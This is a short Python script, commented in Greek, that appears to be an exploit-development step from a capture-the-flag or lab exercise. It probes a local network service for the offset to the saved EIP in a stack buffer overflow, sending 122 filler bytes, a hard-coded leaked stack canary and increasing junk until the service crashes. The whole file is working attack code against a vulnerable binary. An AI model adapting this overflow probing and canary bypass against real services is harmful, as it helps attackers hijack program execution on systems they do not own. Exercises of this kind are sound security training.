import socket

host, port = '127.0.0.1', 28285
canary = b"\x00\x78\x5b\x1b\x1c\x40\x19\x00"

print("--- Searching for EIP Offset ---")

# Δοκιμάζουμε junk από 0 έως 60 bytes
for junk_len in range(0, 60):
    # Στέλνουμε ένα byte που ΣΙΓΟΥΡΑ θα προκαλέσει crash αν κάτσει στο EIP
    # αλλά ΔΕΝ θα προκαλέσει stack smashing αν κάτσει πριν το EIP
    payload = b"A" * 122 + canary + b"A" * junk_len
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        s.connect((host, port))
        s.sendall(payload)
        
        res = s.recv(1024)
        # Αν λάβουμε το "Twit: ..." και η σύνδεση παραμείνει ανοιχτή για λίγο, 
        # σημαίνει ότι ΔΕΝ έχουμε πατήσει ακόμα τη διεύθυνση επιστροφής.
        if b"Twit" in res:
            print(f"Junk {junk_len}: Still safe...")
        s.close()
    except (socket.timeout, ConnectionResetError, EOFError):
        # Αν η σύνδεση κοπεί ΑΚΑΡΙΑΙΑ χωρίς να προλάβει να στείλει το "Twit:",
        # σημαίνει ότι πατήσαμε κάτι κρίσιμο (πιθανώς το EIP).
        print(f"\n[!] CRASH DETECTED at Junk length: {junk_len}")
        print(f"Αυτό είναι το offset σου!")
        break